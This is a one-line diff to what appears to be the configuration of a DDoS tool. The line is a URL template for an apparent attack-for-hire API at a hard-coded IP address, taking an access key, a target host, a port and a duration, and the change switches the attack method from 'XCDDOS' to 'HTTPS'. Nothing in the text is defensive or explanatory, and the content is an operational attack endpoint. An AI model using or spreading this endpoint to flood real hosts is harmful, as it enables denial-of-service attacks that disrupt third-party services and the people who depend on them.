@@ -1,1 +1,1 @@
-http://157.245.145.34:795/api/attack?key=XCDDOS&target={host}&port={port}&time={time}&data=GET&method=XCDDOS
+http://157.245.145.34:795/api/attack?key=XCDDOS&target={host}&port={port}&time={time}&data=GET&method=HTTPS
